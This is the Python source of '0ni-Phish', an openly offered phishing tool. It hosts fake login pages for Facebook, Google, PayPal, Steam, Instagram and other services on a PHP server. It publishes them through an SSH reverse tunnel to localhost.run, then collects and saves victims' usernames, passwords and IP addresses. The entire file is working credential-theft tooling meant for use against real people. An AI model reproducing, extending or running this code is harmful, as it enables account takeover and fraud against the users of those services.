# 0ni-Phish
# By: Euronymou5
# https://twitter.com/Euronymou51
# https://github.com/Euronymou5

import os
import time
from colorama import Fore
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT

global site

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

cf_file = "logs/lh.log"
cf_log = open(cf_file, 'w')

def setup(site):
    print('\n[~] Starting php server...')
    print('[~] Port: 8080')
    os.system(f"php -S localhost:8080 -t pages/{site} > /dev/null 2>&1 & ")
    time.sleep(2)
    print('\n[~] PHP server: ✔️')
    print('\n[~] Creating links...')
    time.sleep(2)
    bgtask("ssh -R 80:localhost:8080 localhost.run -T -n", stdout=cf_log, stderr=cf_log)
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]*.lhr.life)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        time.sleep(1)
    print(f'\n[~] Link: {cf_url}')
    print('\n[~] Waiting for data...')
    while True:
        if os.path.isfile(f'pages/{site}/users.txt'):
            print('\n\033[31m[!] Users found!')
            print('\033[92m')
            os.system(f"cat pages/{site}/users.txt")
            os.system(f"cat pages/{site}/users.txt >> pages/{site}/saved_users.txt")
            os.system(f"rm -rf pages/{site}/users.txt")
            print('\n\033[34m[~] Users saved in: saved_users.txt')
        if os.path.isfile(f'pages/{site}/ip.txt'):
            print('\n\033[31m[!] IP found!')
            print('\033[31m')
            os.system(f"cat pages/{site}/ip.txt")
            os.system(f"cat pages/{site}/ip.txt >> pages/{site}/saved_ip.txt")
            os.system(f"rm -rf pages/{site}/ip.txt")
            print('')
            print('\n\033[34m[~] IP saved in: saved_ip.txt')

def menu():
    os.system("killall php")
    os.system("clear")
    print("""\033[92m
 ██████  ███    ██ ██     ██████  ██   ██ ██ ███████ ██   ██ 
██  ████ ████   ██ ██     ██   ██ ██   ██ ██ ██      ██   ██ 
██ ██ ██ ██ ██  ██ ██     ██████  ███████ ██ ███████ ███████ 
████  ██ ██   ████ ██     ██      ██   ██ ██      ██ ██   ██ 
 ██████  ██    ███ ██     ██      ██   ██ ██ ███████ ██   ██
                  v3.0
           |---[  By: Euronymou5 ]---|       
    """)
    print("""
    [1] Facebook   [2] Google gmail

    [3] Twitter    [4] Netflix

    [5] Github     [6] Discord

    [7] Paypal     [8] Roblox

    [9] Steam      [10] Instagram
    """)
    inl = int(input('\n>> '))
    if inl == 1:
        print('\n[~] Select the language you want to use:')
        print('\n[1] Spanish')
        print('\n[2] English')
        a = int(input('\n>> '))
        if a == 1:
          site = "Facebook"
          setup(site)
        elif a == 2:
            site = "Facebook_en"
            setup(site)
        else:
            menu()
    elif inl == 2:
        site = "Google"
        setup(site)
    elif inl == 3:
        print('\n[~] Select the language you want to use:')
        print('\n[1] Spanish')
        print('\n[2] English')
        a = int(input('\n>> '))
        if a == 1:
          site = "Twitter"
          setup(site)
        elif a == 2:
            site = "Twitter_en"
            setup(site)
        else:
            menu()
    elif inl == 4:
        site = "Netflix"
        setup(site)
    elif inl == 5:
        site = "Github"
        setup(site) 
    elif inl == 6:
        print('\n[~] Select the language you want to use:')
        print('\n[1] Spanish')
        print('\n[2] English')
        a = int(input('\n>> '))
        if a == 1:
          site = "discord"
          setup(site)
        elif a == 2:
            site = "discord_en"
            setup(site)
        else:
            menu()
    elif inl == 7:
        site = "paypal"
        setup(site)
    elif inl == 8:
        print('\n[~] Select the language you want to use:')
        print('\n[1] Spanish')
        print('\n[2] English')
        a = int(input('\n>> '))
        if a == 1:
          site = "roblox_es"
          setup(site)
        elif a == 2:
            site = "roblox_en"
            setup(site)
        else:
            menu()
    elif inl == 9:
        print('\n[~] Select the language you want to use:')
        print('\n[1] Spanish')
        print('\n[2] English')
        a = int(input('\n>> '))
        if a == 1:
          site = "Steam"
          setup(site)
        elif a == 2:
            site = "Steam_en"
            setup(site)
        else:
            menu()
    elif inl == 10:
        site = "instagram"
        setup(site)
    else:
        print(f'{Fore.RED}\n[!] Error invalid option!')
        time.sleep(2)
        menu()


def config():
    home = os.getenv("HOME")
    if os.path.isfile(f'{home}/.ssh/id_rsa'):
        menu()
    else:
        print('\033[31m\n[!] localhost.run key not found.')
        print('\033[32m\n[~] Generating key...')
        time.sleep(2)
        os.system(f"ssh-keygen -N '' -t rsa -f {home}/.ssh/id_rsa")
        time.sleep(2)
        menu()

if __name__ == "__main__":
     config()
